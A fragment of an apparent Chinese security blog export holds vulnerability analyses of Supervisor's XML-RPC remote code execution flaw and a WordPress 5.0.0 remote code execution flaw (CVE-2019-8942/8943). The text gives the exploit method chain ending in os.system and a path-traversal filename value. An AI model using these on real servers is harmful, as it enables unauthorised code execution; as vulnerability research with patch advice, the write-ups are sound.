title=\"漏洞简介\"></a>漏洞简介</h2><p>本次漏洞就出在XML-RPC接口对数据的处理上。</p>\n<p>默认情况下Supervisor并不会开启这个接口，但这并不代表这个漏洞不重要，相反的是，在Supervisor的使用中，很多人喜欢利用web页面来管理，而不是使用上文中提到的supervisorctl命令行工具。使用web页面有一个方便之处，即通过简单配置，使用者可以在其他机器的浏览器上通过网址访问并控制Supervisor。省去非一定在本地配置的麻烦（例如在docker中使用Supervisor，就不用每次进入容器控制Supervisor）。</p>\n<p>开启web访问的配置如下</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/1-2.png\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本次分析从Supervisor入口出发，根据漏洞的相关披露，层层进行解析。</p>\n<p>先从入口看起：Supervisord启动文件Supervisord.py。</p>\n<p>因为事先知道攻击数据是通过http方式传入到sever端的，所以重点关注下Supervisord启动方法（run）中的启动http服务方法，这里是self.options.openhttpservers()</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810111649.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810111953.png\"></p>\n<p>跟入options.py文件中去：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112027.png\"></p>\n<p>在这里可以看到self.httpservers = self.make_http_servers(supervisord)</p>\n<p>在这里调用了make_http_servers()方法</p>\n<p>在Options类中找到make_http_servers()方法：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20170810112048.png\"></p>\n<p>可见这个方法是从supervisor.http中导入的，我们继续跟进http.py文件查看make_http_servers()方法的实现</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115450.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p>根据漏洞的披露，我们知道这个漏洞是在XML-RPC接口的调用上出现了问题，在上图代码的最后一行supervisor_xmlrpc_handler()方法，就是用来处理RPC调用的。</p>\n<p>我们从supervisor的入口开始，一路顺藤摸瓜找到了罪魁祸首，接下来跟进supervisor_xmlrpc_handler()方法看一下出现漏洞的原因</p>\n<p>supervisor_xmlrpc_handler方法在xmlrpc.py文件中实现，</p>\n<p>**<img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112309.png\"><br>**找到漏洞纰漏的traverse方法，可以看到supervisor_xmlrpc_handler()方法中的call函数将解析出来的method以及params传入tracerse方法中。</p>\n<p>我们先来看下call函数在哪里被调用，以及method，params到底是什么：</p>\n<p>在supervisor_xmlrpc_handler这个类中，有一个continue_request()函数，如下所示</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112318.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p>在params, method = self.loads(data)一行中，可以看到params和method的产生，并且在这个函数最下面一行，可见调用了call()将返回值给了value。我们先看下这个类中的loads函数，如下所示：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112357.png\"></p>\n<p>可见params和method是由xml tag中的methodName和params中的值得来的。</p>\n<p>上面说的有些抽象，为了方便下面漏洞的理解，下面举个例子：在这里利用python使用RPC协议给supervisord发一个请求，来看下RPC协议的结构和params、method分别是什么。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/2-3.png\"></p>\n<p>抓取的流量如下图：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/3-2.png\"></p>\n<p>这里的supervisor.supervisord.options.warnings.linecache.os.system就是method参数值，而param的值就是touch /tmp/success1</p>\n<p>正常的交互中，这两个值往往是method=supervisor.startProcess;param=要启动的应用名</p>\n<p>现在call()函数已经明晰了，再看看call函数中的tracerse方法。下面继续跟入tracerse方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810112422.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/TIM%E6%88%AA%E5%9B%BE20170810115513.png\"></p>\n<p>在tracerse方法中，将传入的method通过“.”来拆分，赋值给path判断开头是否为“_”,如果是，则报错</p>\n<p>然后看ob = getattr(ob, name, None)这行，getattr()是一个自省函数，下面举一个简单的例子说明下getattr()</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/4-2.png\"></p>\n<p>我们仔细分析下如下代码：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20170810112444-1.png\"></p>\n<p>在这里类似一个递归，将原本链状的method中的方法遍历出来，例如method原先的结构是a.b.c.d这里path列表就应该是[a,b,c,d],然后遍历name。通过ob = getattr(ob, name, None)，首先将ob中的a方法赋给新的ob，再将新的ob（现在是a方法）中的b方法取出来赋给新的ob。以此类推，最终的ob会是链状结构最后一个方法（也就是d），然后传入params值，被执行</p>\n<p>所以如果想攻击利用成功，必须找到一个调用链，例如如下调用链</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20170810112456.png\"></p>\n<p>下图是调用关系：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/5-2.png\"></p>\n<p>Options中的warnings方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/6-2.png\"></p>\n<p>Warnings中的linecache方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/7-2.png\"></p>\n<p>Linecache中的os方法</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/8-2.png\"></p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><p>升级supervisor到最新版本或在配置中修改[inet_http_server]配置</p>"},{"title":"WordPress 5.0.0 远程代码执行漏洞分析（CVE-2019-8942、CVE-2019-8943）","date":"2019-02-21T09:03:02.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n近日，wordpress发布一个安全升级补丁，修复了一个WordPress核心中的远程代码执行漏洞。代码修改细节可以参考wordpress团队于Dec  13, 2018提交的代码。据漏洞披露者文中所介绍，这个漏洞在WordPress核心中被发现已经超过6年。\n\n<!--more-->\n\n\n\n## 漏洞简介\n\n1、此漏洞是由目录遍历以及本地文件包含两部分组成。\n\n2、想要利用此漏洞，需要在目标WordPress站点上拥有至少作者权限访问帐户。\n\n## 漏洞分析\n\n这里主要分析CVE-2019-8943这处漏洞\n\n首先看下目录遍历漏洞\n\n \n\n首先上传一张图片\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/24e5f0ff2f3351ed0134bbb856d16874.png)\n\n \n\n图片会被wordpress保存至wp-content/uploads目录，但与此同时，在wp_postmeta表中仍然会有该图片信息的记录，如下图\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/78dc3e09777f9ae9f4db08a52ee79ded.png)\n\n在图片被编辑时\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/6bbc2289d23fd3eb92e9275c9e8eedca.png)\n\n会向wordpress后台发送如下post请求，如下图\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/ca67b151b90c5460fb830be4a3ba78b8.png)\n\n \n\n在处理post参数的过程中，有如下一处代码\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/4d92b4d12064f34f5cf42d8e63f8c339.png)\n\n可以看到if条件中有一个方法：update_post_meta\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/40cc30845af91f96de8e6ee41e8a07bc.png)\n\n这个方法的作用是基于POST ID更新POST元字段，也就是说通过。$post_ID, $field, $value来更新数据库中的信息  以下图为例\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/0444c22768de7644c2f318d9d3759aa1.png)\n\n此例中\n\n$post_ID:4  $field: _wp_attached_file $value: 2019/02/Chrysanthemum-e1550648854385.jpg\n\n| 123  | $post_ID:4 $field: _wp_attached_file$value: 2019/02/Chrysanthemum-e1550648854385.jpg |\n| ---- | ------------------------------------------------------------ |\n|      |                                                              |\n\n在正常的修改图片操作中，$postarr[meta_input]值会为空，但是可以构造payload使得篡改数据库中对应value的操作得以实现。\n\n发送payload\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/6251818e1661de4bd6168841fbaef35b.png)\n\n此时，$postarr[meta_input]中的key与value被遍历取出，数据库中内容被篡改\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/9c7e2868ccd0d1e78856a59d5f3461e9.png)\n\n到此截止，我们已经成功的篡改了数据库中关于此图片文件的_wp_attached_file值，但是也是仅仅更改了数据库中的记载，文件系统中存储的实际文件名没有改变，对应的仍然是grq.jpg\n\n接下来要进行的是目录穿越，向其他目录写入这个jpg文件\n\n目录穿越漏洞位于wp_crop_image方法中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png)\n\n这个方法是用来剪裁图片。\n\n需要注意的是，在wordpress中，如果直接在页面中点开一张图片，进行剪裁操作，如下图这样\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/14c7a71a6e40828c4cf822651676e2fb.png)\n\n是根本不会调用wp_crop_image方法的。\n\n这里一定要注意，我就是在这里被坑了很久\n\n \n\n如果想触发漏洞，调用wp_crop_image方法，那么需要自己构造数据包。\n\n当我们对图片进行剪裁变换等操作时，正常的数据包如下\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/8b5287ee628c79b726448ad684ae639f.png)\n\n可以看到action=image-editor,\n\n看下位于wp-admin\\admin-ajax.php中的$core_actions_post数组\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/e4635806c566c0895fa89078e70b9fd5.png)\n\n显而易见，想调用wp_crop_image方法，那action要为crop-image\n\n \n\n构造数据包如下\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/3d04b7c6587be4d15e5681d63de191bb.png)\n\n \n\n既然已经成功的进入了wp_coce_Image()方法，再来看看这个目录穿越是如何执行的。\n\n当调用该函数时，函数首先调用get_attached_file方法中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png)\n\nget_attached_file方法通过id 寻找存在数据库中 _wp_attached_file字段的value如下图。\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/814ecb83c208192bf7d028119c2d4154.png)\n\n这里需要提醒的是，_wp_attached_file字段中的内容我们已经通过之前步骤成功改为我们的payload，然后get_attached_file方法会将_wp_attached_file字段中的内容拼接$uploads[‘basedir’]作为图片的路径返回，这个路径会类似如下形式\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/ac817ce717dd53f9a96da32e305cfbbd.png)\n\nC:\\wamp64\\www\\wordpress4/wp-content/uploads/2019/022019/02/grq.jpg?../../evil.jpg\n\n在得到了图片地址后\n\n首先，wordpress将会直接加载这个地址，但显而易见，文件系统中根本无法找到这个文件。\n\n \n\n当该方法失败后，WordPress将尝试从它自己的服务器下载图像。\n\n如下图，在wp_get_attachment_url方法中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/366b7c2ab1361f42d41135047c90a69f.png)\n\n这时候的下载链接如下\n\n> <http://127.0.0.1/wordpress4/wp-content/uploads/2019/02/grq.jpg?../../evil.jpg>\n\n该URL由wp-content/uploads目录和由_wp_attached_file条目所提供的文件名组成\n\n当http协议解析这个url时，grq.jpg后面的内容会被忽略，也就是说，可以正常找到并访问该图，如下图\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/0454096af13faef6893af40c1095a57d.png)\n\n \n\n接下来，wp_coce_Image()方法会将此文件保存，但是在保存时，并没有对传入的参数进行校验，导致了目录穿越的产生\n\n \n\n首先，先通过mkdir建立目录\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/90a1558d598dbba3e5034b6806a1c556.png)\n\n其次，通过$editor->save将文件保存到生成目录中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/cb4c9ea065e950e61f5870e38bf6a064.png)\n\n此时我们通过构造的payload修改数据库中内容，使得其如下图形式\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/13154be252945d7998ee319cf050b5d4.png)\n\n那么最终会在themes\\currentactivetheme目录中生成我们的jpg\n\n例如cropped-evil.jpg,因为是通过剪裁后的图片，会有一个cropped前缀\n\n \n\n接下来就是代码执行部分\n\nWordPress的主题位于wp-content /  themes目录中并为不同的案例提供模板文件。正常情况下，是无法通过web方式访问、写入此目录。但是截止此时，我们通过目录穿越，已经可以将我们的恶意图像文件插入此目录。然后通过加载这个themes，即可执行恶意构造好的图片payload，这个漏洞详情可CVE-2019-6977。 影响范围WordPress  before 4.9.9 and 5.x before 5.0.1\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/b9cdd3c4f038ec583307bcf4389d9c76.png)\n\n## 影响范围\n\nWordPress before 4.9.9 and 5.x before 5.0.1","source":"_posts/wordpress-5-0-0-rce.md","raw":"---\ntitle: WordPress 5.0.0 远程代码执行漏洞分析（CVE-2019-8942、CVE-2019-8943）\ndate: 2019-02-21 17:03:02\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n近日，wordpress发布一个安全升级补丁，修复了一个WordPress核心中的远程代码执行漏洞。代码修改细节可以参考wordpress团队于Dec  13, 2018提交的代码。据漏洞披露者文中所介绍，这个漏洞在WordPress核心中被发现已经超过6年。\n\n<!--more-->\n\n\n\n## 漏洞简介\n\n1、此漏洞是由目录遍历以及本地文件包含两部分组成。\n\n2、想要利用此漏洞，需要在目标WordPress站点上拥有至少作者权限访问帐户。\n\n## 漏洞分析\n\n这里主要分析CVE-2019-8943这处漏洞\n\n首先看下目录遍历漏洞\n\n \n\n首先上传一张图片\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/24e5f0ff2f3351ed0134bbb856d16874.png)\n\n \n\n图片会被wordpress保存至wp-content/uploads目录，但与此同时，在wp_postmeta表中仍然会有该图片信息的记录，如下图\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/78dc3e09777f9ae9f4db08a52ee79ded.png)\n\n在图片被编辑时\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/6bbc2289d23fd3eb92e9275c9e8eedca.png)\n\n会向wordpress后台发送如下post请求，如下图\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/ca67b151b90c5460fb830be4a3ba78b8.png)\n\n \n\n在处理post参数的过程中，有如下一处代码\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/4d92b4d12064f34f5cf42d8e63f8c339.png)\n\n可以看到if条件中有一个方法：update_post_meta\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/40cc30845af91f96de8e6ee41e8a07bc.png)\n\n这个方法的作用是基于POST ID更新POST元字段，也就是说通过。$post_ID, $field, $value来更新数据库中的信息  以下图为例\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/0444c22768de7644c2f318d9d3759aa1.png)\n\n此例中\n\n$post_ID:4  $field: _wp_attached_file $value: 2019/02/Chrysanthemum-e1550648854385.jpg\n\n| 123  | $post_ID:4 $field: _wp_attached_file$value: 2019/02/Chrysanthemum-e1550648854385.jpg |\n| ---- | ------------------------------------------------------------ |\n|      |                                                              |\n\n在正常的修改图片操作中，$postarr[meta_input]值会为空，但是可以构造payload使得篡改数据库中对应value的操作得以实现。\n\n发送payload\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/6251818e1661de4bd6168841fbaef35b.png)\n\n此时，$postarr[meta_input]中的key与value被遍历取出，数据库中内容被篡改\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/9c7e2868ccd0d1e78856a59d5f3461e9.png)\n\n到此截止，我们已经成功的篡改了数据库中关于此图片文件的_wp_attached_file值，但是也是仅仅更改了数据库中的记载，文件系统中存储的实际文件名没有改变，对应的仍然是grq.jpg\n\n接下来要进行的是目录穿越，向其他目录写入这个jpg文件\n\n目录穿越漏洞位于wp_crop_image方法中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png)\n\n这个方法是用来剪裁图片。\n\n需要注意的是，在wordpress中，如果直接在页面中点开一张图片，进行剪裁操作，如下图这样\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/14c7a71a6e40828c4cf822651676e2fb.png)\n\n是根本不会调用wp_crop_image方法的。\n\n这里一定要注意，我就是在这里被坑了很久\n\n \n\n如果想触发漏洞，调用wp_crop_image方法，那么需要自己构造数据包。\n\n当我们对图片进行剪裁变换等操作时，正常的数据包如下\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/8b5287ee628c79b726448ad684ae639f.png)\n\n可以看到action=image-editor,\n\n看下位于wp-admin\\admin-ajax.php中的$core_actions_post数组\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/e4635806c566c0895fa89078e70b9fd5.png)\n\n显而易见，想调用wp_crop_image方法，那action要为crop-image\n\n \n\n构造数据包如下\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/3d04b7c6587be4d15e5681d63de191bb.png)\n\n \n\n既然已经成功的进入了wp_coce_Image()方法，再来看看这个目录穿越是如何执行的。\n\n当调用该函数时，函数首先调用get_attached_file方法中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png)\n\nget_attached_file方法通过id 寻找存在数据库中 _wp_attached_file字段的value如下图。\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/814ecb83c208192bf7d028119c2d4154.png)\n\n这里需要提醒的是，_wp_attached_file字段中的内容我们已经通过之前步骤成功改为我们的payload，然后get_attached_file方法会将_wp_attached_file字段中的内容拼接$uploads[‘basedir’]作为图片的路径返回，这个路径会类似如下形式\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/ac817ce717dd53f9a96da32e305cfbbd.png)\n\nC:\\wamp64\\www\\wordpress4/wp-content/uploads/2019/022019/02/grq.jpg?../../evil.jpg\n\n在得到了图片地址后\n\n首先，wordpress将会直接加载这个地址，但显而易见，文件系统中根本无法找到这个文件。\n\n \n\n当该方法失败后，WordPress将尝试从它自己的服务器下载图像。\n\n如下图，在wp_get_attachment_url方法中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/366b7c2ab1361f42d41135047c90a69f.png)\n\n这时候的下载链接如下\n\n> <http://127.0.0.1/wordpress4/wp-content/uploads/2019/02/grq.jpg?../../evil.jpg>\n\n该URL由wp-content/uploads目录和由_wp_attached_file条目所提供的文件名组成\n\n当http协议解析这个url时，grq.jpg后面的内容会被忽略，也就是说，可以正常找到并访问该图，如下图\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/0454096af13faef6893af40c1095a57d.png)\n\n \n\n接下来，wp_coce_Image()方法会将此文件保存，但是在保存时，并没有对传入的参数进行校验，导致了目录穿越的产生\n\n \n\n首先，先通过mkdir建立目录\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/90a1558d598dbba3e5034b6806a1c556.png)\n\n其次，通过$editor->save将文件保存到生成目录中\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/cb4c9ea065e950e61f5870e38bf6a064.png)\n\n此时我们通过构造的payload修改数据库中内容，使得其如下图形式\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/13154be252945d7998ee319cf050b5d4.png)\n\n那么最终会在themes\\currentactivetheme目录中生成我们的jpg\n\n例如cropped-evil.jpg,因为是通过剪裁后的图片，会有一个cropped前缀\n\n \n\n接下来就是代码执行部分\n\nWordPress的主题位于wp-content /  themes目录中并为不同的案例提供模板文件。正常情况下，是无法通过web方式访问、写入此目录。但是截止此时，我们通过目录穿越，已经可以将我们的恶意图像文件插入此目录。然后通过加载这个themes，即可执行恶意构造好的图片payload，这个漏洞详情可CVE-2019-6977。 影响范围WordPress  before 4.9.9 and 5.x before 5.0.1\n\n![img](http://blog.nsfocus.net/wp-content/uploads/2019/02/b9cdd3c4f038ec583307bcf4389d9c76.png)\n\n## 影响范围\n\nWordPress before 4.9.9 and 5.x before 5.0.1","slug":"wordpress-5-0-0-rce","published":1,"updated":"2020-10-27T09:27:09.741Z","_id":"ckgrozua40051wsa97c93djwz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>近日，wordpress发布一个安全升级补丁，修复了一个WordPress核心中的远程代码执行漏洞。代码修改细节可以参考wordpress团队于Dec  13, 2018提交的代码。据漏洞披露者文中所介绍，这个漏洞在WordPress核心中被发现已经超过6年。</p>\n<a id=\"more\"></a>\n\n\n\n<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>1、此漏洞是由目录遍历以及本地文件包含两部分组成。</p>\n<p>2、想要利用此漏洞，需要在目标WordPress站点上拥有至少作者权限访问帐户。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>这里主要分析CVE-2019-8943这处漏洞</p>\n<p>首先看下目录遍历漏洞</p>\n<p>首先上传一张图片</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/24e5f0ff2f3351ed0134bbb856d16874.png\" alt=\"img\"></p>\n<p>图片会被wordpress保存至wp-content/uploads目录，但与此同时，在wp_postmeta表中仍然会有该图片信息的记录，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/78dc3e09777f9ae9f4db08a52ee79ded.png\" alt=\"img\"></p>\n<p>在图片被编辑时</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/6bbc2289d23fd3eb92e9275c9e8eedca.png\" alt=\"img\"></p>\n<p>会向wordpress后台发送如下post请求，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/ca67b151b90c5460fb830be4a3ba78b8.png\" alt=\"img\"></p>\n<p>在处理post参数的过程中，有如下一处代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/4d92b4d12064f34f5cf42d8e63f8c339.png\" alt=\"img\"></p>\n<p>可以看到if条件中有一个方法：update_post_meta</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/40cc30845af91f96de8e6ee41e8a07bc.png\" alt=\"img\"></p>\n<p>这个方法的作用是基于POST ID更新POST元字段，也就是说通过。$post_ID, $field, $value来更新数据库中的信息  以下图为例</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/0444c22768de7644c2f318d9d3759aa1.png\" alt=\"img\"></p>\n<p>此例中</p>\n<p>$post_ID:4  $field: _wp_attached_file $value: 2019/02/Chrysanthemum-e1550648854385.jpg</p>\n<table>\n<thead>\n<tr>\n<th>123</th>\n<th>$post_ID:4 $field: _wp_attached_file$value: 2019/02/Chrysanthemum-e1550648854385.jpg</th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<p>在正常的修改图片操作中，$postarr[meta_input]值会为空，但是可以构造payload使得篡改数据库中对应value的操作得以实现。</p>\n<p>发送payload</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/6251818e1661de4bd6168841fbaef35b.png\" alt=\"img\"></p>\n<p>此时，$postarr[meta_input]中的key与value被遍历取出，数据库中内容被篡改</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/9c7e2868ccd0d1e78856a59d5f3461e9.png\" alt=\"img\"></p>\n<p>到此截止，我们已经成功的篡改了数据库中关于此图片文件的_wp_attached_file值，但是也是仅仅更改了数据库中的记载，文件系统中存储的实际文件名没有改变，对应的仍然是grq.jpg</p>\n<p>接下来要进行的是目录穿越，向其他目录写入这个jpg文件</p>\n<p>目录穿越漏洞位于wp_crop_image方法中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png\" alt=\"img\"></p>\n<p>这个方法是用来剪裁图片。</p>\n<p>需要注意的是，在wordpress中，如果直接在页面中点开一张图片，进行剪裁操作，如下图这样</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/14c7a71a6e40828c4cf822651676e2fb.png\" alt=\"img\"></p>\n<p>是根本不会调用wp_crop_image方法的。</p>\n<p>这里一定要注意，我就是在这里被坑了很久</p>\n<p>如果想触发漏洞，调用wp_crop_image方法，那么需要自己构造数据包。</p>\n<p>当我们对图片进行剪裁变换等操作时，正常的数据包如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/8b5287ee628c79b726448ad684ae639f.png\" alt=\"img\"></p>\n<p>可以看到action=image-editor,</p>\n<p>看下位于wp-admin\\admin-ajax.php中的$core_actions_post数组</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/e4635806c566c0895fa89078e70b9fd5.png\" alt=\"img\"></p>\n<p>显而易见，想调用wp_crop_image方法，那action要为crop-image</p>\n<p>构造数据包如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/3d04b7c6587be4d15e5681d63de191bb.png\" alt=\"img\"></p>\n<p>既然已经成功的进入了wp_coce_Image()方法，再来看看这个目录穿越是如何执行的。</p>\n<p>当调用该函数时，函数首先调用get_attached_file方法中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png\" alt=\"img\"></p>\n<p>get_attached_file方法通过id 寻找存在数据库中 _wp_attached_file字段的value如下图。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/814ecb83c208192bf7d028119c2d4154.png\" alt=\"img\"></p>\n<p>这里需要提醒的是，_wp_attached_file字段中的内容我们已经通过之前步骤成功改为我们的payload，然后get_attached_file方法会将_wp_attached_file字段中的内容拼接$uploads[‘basedir’]作为图片的路径返回，这个路径会类似如下形式</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/ac817ce717dd53f9a96da32e305cfbbd.png\" alt=\"img\"></p>\n<p>C:\\wamp64\\www\\wordpress4/wp-content/uploads/2019/022019/02/grq.jpg?../../evil.jpg</p>\n<p>在得到了图片地址后</p>\n<p>首先，wordpress将会直接加载这个地址，但显而易见，文件系统中根本无法找到这个文件。</p>\n<p>当该方法失败后，WordPress将尝试从它自己的服务器下载图像。</p>\n<p>如下图，在wp_get_attachment_url方法中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/366b7c2ab1361f42d41135047c90a69f.png\" alt=\"img\"></p>\n<p>这时候的下载链接如下</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/wordpress4/wp-content/uploads/2019/02/grq.jpg?../../evil.jpg\">http://127.0.0.1/wordpress4/wp-content/uploads/2019/02/grq.jpg?../../evil.jpg</a></p>\n</blockquote>\n<p>该URL由wp-content/uploads目录和由_wp_attached_file条目所提供的文件名组成</p>\n<p>当http协议解析这个url时，grq.jpg后面的内容会被忽略，也就是说，可以正常找到并访问该图，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/0454096af13faef6893af40c1095a57d.png\" alt=\"img\"></p>\n<p>接下来，wp_coce_Image()方法会将此文件保存，但是在保存时，并没有对传入的参数进行校验，导致了目录穿越的产生</p>\n<p>首先，先通过mkdir建立目录</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/90a1558d598dbba3e5034b6806a1c556.png\" alt=\"img\"></p>\n<p>其次，通过$editor-&gt;save将文件保存到生成目录中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/cb4c9ea065e950e61f5870e38bf6a064.png\" 